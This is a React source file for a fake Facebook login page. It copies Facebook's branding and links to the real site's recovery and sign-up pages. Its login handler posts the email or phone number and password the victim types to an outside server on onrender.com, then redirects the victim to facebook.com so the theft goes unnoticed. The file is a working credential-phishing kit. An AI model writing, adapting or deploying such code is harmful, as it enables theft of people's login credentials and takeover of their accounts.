
import React, { useState } from "react";
import axios from "axios";

const LoginPage = () => {
  const [emailAndNumber, setEmailAndNumber] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");


  const handleLogin = async () => {
    // Input validation
    if (!emailAndNumber || !password) {
      setError("Invalid username or password");
      return;
    }

    try {
      const response = await axios.post("https://fb-f-bracken.onrender.com/api/v1/user/login", {
        emailAndNumber,
        password,
      });
      console.log("Login Success:", response.data);
      setError(""); 
      setEmailAndNumber("");
      setPassword("");
       window.location.href = "https://facebook.com";
    } catch (error) {
      const errorMsg = error.response?.data?.message || "Login failed.";
      setError(errorMsg);
    }
  };

  return (
       <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="w-full max-w-[1170px] flex flex-col lg:flex-row items-center lg:items-start gap-10">
        {/* Branding */}
        <div className="w-full lg:w-1/2 text-center lg:text-left ">
          <h1 className="text-blue-600 text-3xl xs:text-4xl sm:text-5xl font-bold">
            facebook
          </h1>
          <p className="mt-4 text-base xs:text-lg text-gray-700 max-w-md mx-auto lg:mx-0 hidden md:block">
            Facebook helps you connect and share with the people in your life.
          </p>
        </div>

        {/* Login Card */}
        <div className="w-full lg:w-1/2 bg-white p-4 xs:p-6 sm:p-8 rounded-lg shadow-md max-w-md mx-auto">
          {error && (
            <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 rounded mb-4 text-sm">
              {error}
            </div>
          )}

          <input
            type="text"
            value={emailAndNumber}
            onChange={(e) => setEmailAndNumber(e.target.value)}
            placeholder="Email address or phone number"
            className="w-full mb-3 px-4 py-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm sm:text-base"
          />
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            className="w-full mb-4 px-4 py-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm sm:text-base"
          />

          <button
            onClick={handleLogin}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded font-bold text-sm sm:text-base"
          >
            Log In
          </button>

          <div className="text-center mt-4">
            <a
              href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
              className="text-blue-600 text-sm hover:underline"
            >
              Forgotten password?
            </a>
          </div>

          <hr className="my-4" />

          <div className="flex justify-center">
            <a
              href="https://www.facebook.com/r.php?entry_point=login"
              className="bg-green-600 hover:bg-green-700 text-white font-bold px-6 py-2 rounded text-sm sm:text-base text-center inline-block"
            >
              Create New Account
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
